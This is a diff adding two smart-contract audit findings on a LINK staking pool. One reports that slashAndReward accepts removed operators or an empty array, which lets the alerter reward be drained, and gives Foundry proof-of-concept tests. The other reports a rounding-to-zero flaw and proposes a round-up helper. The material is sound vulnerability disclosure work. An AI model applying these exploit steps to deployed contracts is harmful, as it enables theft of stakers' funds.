@@ -183,3 +183,195 @@ function removeOperators(address[] calldata operators)
       emit OperatorRemoved(operatorAddress, principal);
     }
 ```
+# **[H-03]** - Alerter can slash the removed operators and steal the alerter reward
+
+### Summary:
+
+Imagine a scenario in which the slashAndReward function is called, and a list of operators, who have already been removed, are passed as an argument (the absence of zero-address check could also be abused here). 
+
+The `slashAndReward()` function does not validates the input but executes the function and transfers the `ALERTER_REWARD_AMOUNT` from the `s_alerterRewardFunds`. The worst part is that `slashAndReward()` can also be called by passing an empty operators array which warrants the need for strict checks on the operators being passed in the input.
+
+### Impact:
+
+The Alerter can steal funds from the Operator Staking Pool.
+
+### Proof of Concept:
+
+```javascript
+function test_RemovedOperatorsCanBeSlashed() public {
+
+    //Deposit Alerter Reward in the Operator Staking Pool
+    changePrank(OWNER);
+    uint256 amountFunded = 200 ether;
+    s_LINK.approve(address(s_operatorStakingPool), 200 ether);
+    s_operatorStakingPool.depositAlerterReward(amountFunded);
+
+    address[] memory slashedOperators = _getSlashableOperators();
+    
+    uint256 balanceOfAlerterBefore = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
+    console.log("Balance of alerter before: ", balanceOfAlerterBefore);
+    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));
+
+    //Remove the Operators from the Operators Staking Pool
+    changePrank(OWNER);
+    s_operatorStakingPool.removeOperators(slashedOperators);
+    
+    //Slash the removed operators for ALERTER_REWARD_AMOUNT
+    changePrank(address(s_pfAlertsController));
+    s_operatorStakingPool.slashAndReward(
+      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
+    );
+
+    uint256 balanceOfAlerterAfter = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
+    console.log("Balance of alerter after: ", balanceOfAlerterAfter);
+    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));
+
+    assertEq(ALERTER_REWARD_AMOUNT, balanceOfAlerterAfter - balanceOfAlerterBefore);
+  }
+
+/// POC for Case #2 - Passing Empty Operator Array
+
+function test_EmptyOperatorListCanBeSlashed() public {
+    
+    //Deposit Alerter Reward in the Operator Staking Pool
+    changePrank(OWNER);
+    uint256 amountFunded = 200 ether;
+    s_LINK.approve(address(s_operatorStakingPool), 200 ether);
+    s_operatorStakingPool.depositAlerterReward(amountFunded);
+
+    //Define an empty array of Operators
+    address[] memory slashedOperators = new address[](0);
+    uint256 balanceOfAlerterBefore = s_LINK.balanceOf(address(COMMUNITY_STAKER_ONE));
+    console.log("Balance of alerter before: ", balanceOfAlerterBefore);
+    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));
+
+    //Slash the empty operators for ALERTER_REWARD_AMOUNT
+    changePrank(address(s_pfAlertsController));
+    s_operatorStakingPool.slashAndReward(
+      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
+    );
+
+    uint256 balanceOfAlerterAfter = s_LINK.balanceOf(address(COMMUNITY_STAKER_ONE));
+    console.log("Balance of alerter before: ", balanceOfAlerterAfter);
+    console.log("Balance of LINK in Operator StakingPool after: ", s_LINK.balanceOf(address(s_operatorStakingPool)));
+    
+    assertEq(ALERTER_REWARD_AMOUNT, balanceOfAlerterAfter - balanceOfAlerterBefore);
+  }
+```
+
+### Recommended Mitigation Steps:
+
+Validate the input parameters for the slashAndReward function and add proper checks to ensure that the operators:
+1. Aren't removed.
+2. Aren't already slashed.
+3. Array isn't empty.
+
+
+
+
+# **[M-01]** - Precision loss 'slashAndReward()' leads to leaked value for the protocol
+
+# Summary:
+
+In the given formula, the variable principalAmount is susceptible to precision
+loss. When this value is passed to the slashOperators function to deduct from
+the operators, this loss in precision could result in the value becoming zero.
+Consequently, the rewards might not be updated appropriately.
+
+# Impact:
+
+Stakers might evade the slashing mechanism, leading to a potential loss of
+funds for the protocol. This is concerning, especially since the alerter's
+compensation is derived from the slashed amount.
+
+# Proof of Concept:
+
+`slashAndReward` calls `_getRemainingSlashCapacity`
+
+```javascript
+function _getRemainingSlashCapacity(
+    SlasherConfig memory slasherConfig,
+    address slasher
+  ) private view returns (uint256) {
+    SlasherState memory slasherState = s_slasherState[slasher];
+    uint256 refilledAmount =
+      (block.timestamp - slasherState.lastSlashTimestamp) * slasherConfig.refillRate;
+
+    return Math.min(
+      slasherConfig.slashCapacity, slasherState.remainingSlashCapacityAmount + refilledAmount
+    );
+  }
+```
+
+The average block time is roughly 12-15 seconds. 
+However, it's important to note that this is an average, and there can be 
+variability.
+
+If you're subtracting `slasherState.lastSlashTimestamp` from `block.timestamp`, 
+The smallest this number can be is theoretically 1 second, assuming the previous 
+transaction was mined in the previous block and the next transaction 
+(with the subtraction) is mined in the very next block.
+
+However, in practice, due to the average block time being around 12 seconds, 
+the difference would typically be at least 12 seconds or more. But remember, 
+it's not guaranteed to be exactly 12 seconds due to the probabilistic nature 
+of block mining.
+
+Given the function `_getRemainingSlashCapacity`, the refilledAmount is calculated based on the difference 
+between the current block.timestamp and the slasherState.lastSlashTimestamp multiplied by the slasherConfig.refillRate.
+
+If the refillRate is 1 ETH and considering the smallest time difference between 
+blocks (as discussed earlier, it can be as low as 1 second in theory but 
+typically around 12 seconds), the smallest refilledAmount can be:
+
+For a 1-second difference:
+
+`refilledAmount = 1 * 1 = 1`
+
+For a typical 12-second difference:
+
+`refilledAmount = 12 * 1 = 12`
+
+So, the smallest refilled amount can be 1 if there's a 1-second difference 
+between the current block timestamp and the lastSlashTimestamp. However, 
+in practice, it would typically be 12 for a 12-second block time.
+
+We can see here that `slashAndReward` determines the amount slashed here.
+
+```solidity
+if (combinedSlashAmount > remainingSlashCapacity) {
+      /// @dev If a slashing occurs with an amount to be slashed that is higher than the remaining
+      /// slashing capacity, only an amount equal to the remaining capacity is slashed.
+      //@audit -precision loss here
+      principalAmount = remainingSlashCapacity / stakers.length;
+    }
+```
+
+If the remainingSlashCapacity is low, as we've shown is possible above,
+the principalAmount will be round down to zero. Leaving the operators unslashableand causing the alerter to remove rewards.
+
+Consider the following example: 
+```
+//remainingSlashCapacity = 12
+// stakers length = 15
+// principalAmount = 12 / 15 = 0 
+```
+Though the likelihood of this occurring is low it is possible if the remainingSlashCapacity
+is small. Leading to rounding to zero.
+
+
+### Recommended Mitigation Steps:
+
+The easiest fix is to create a function that always rounds up. 
+
+```javascript
+/**
+     * @param a numerator
+     * @param b denominator
+     * @dev Division, rounded up
+     */
+    function roundUpDiv(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) return 0;
+        return (a - 1) / b + 1
+    }
+```
